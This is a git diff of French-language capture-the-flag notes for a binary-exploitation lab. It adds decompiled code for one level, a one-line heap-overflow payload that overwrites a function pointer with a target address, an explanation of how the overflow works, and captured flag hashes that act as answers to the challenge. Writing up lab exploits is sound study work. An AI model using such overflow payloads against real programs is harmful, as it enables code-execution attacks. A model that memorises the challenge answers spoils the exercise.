@@ -166,6 +166,33 @@ End of assembler dump.
 0x8049838 <exit@got.plt>:       0x080483d6
 
 
-# flag : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+## flag : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 
 # flag 06
+
+addresse de n (target function) : 0x08048454
+
+void main(undefined4 param_1,int param_2)
+
+{
+  char *__dest;
+  undefined4 *puVar1;
+  
+  __dest = malloc(0x40);
+  puVar1 = malloc(4);
+  *puVar1 = m;
+  strcpy(__dest,*(char **)(param_2 + 4));
+  (*(code *)*puVar1)();
+  return;
+}
+
+./level6 $(python -c 'print(("A" * 72) + "\x54\x84\x04\x08")') 1
+
+A * 64 remplit les données de _dest
+A * 8 remplit le chunk header du malloc de puVar1
+l'addresse de n (0x08048454) est écrite dans puVar1
+quand le pointeur de fonction (*(code *)*puVar1)() est appelé, il exécute la fonction n
+## flag : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+# flag 07
+
